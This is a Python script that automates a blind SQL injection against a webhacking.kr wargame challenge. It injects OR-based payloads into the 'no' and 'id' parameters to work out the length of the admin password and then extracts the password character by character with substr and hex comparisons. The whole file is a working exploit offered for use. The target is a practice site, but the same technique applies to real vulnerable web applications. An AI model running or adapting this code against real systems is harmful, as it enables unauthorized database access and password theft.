import requests
import string

url="https://webhacking.kr/challenge/web-29/"
cookies={'PHPSESSID':""}
ascii_code=string.digits+string.ascii_letters+"_"
utf="utf-8"

def getLength():
    for i in range(1, 100):
        print("(+) Started {}".format(i))
        params="?no=0||length(pw)={}&&no>1&id=abcd'or%09id='admin'%23&pw=guest".format(i)
        find_url=url+params
        response=requests.post(find_url, cookies=cookies)

        if response.text.find("admin password")>0:
            print("(+) pw length is {}".format(i))
            break

    return i

def getPW(len):
    result=""
    for i in range(1, len+1):
        print(f"(+) {i} index started.")
        for char in ascii_code:
            params = "?no=0||substr(pw,{},1)={}&id=1&pw=1".format(i, hex(ord(char)))
            find_url = url + params
            response = requests.post(find_url, cookies=cookies)

            if response.text.find("admin password")>0:
                result+=char
                print("(+) Current Result is {}".format(result))
                break
            if response.text.find("access")>0:
                print("(!) Response contain Accessed denied")
                exit()

if __name__=="__main__":
    getPW(getLength())

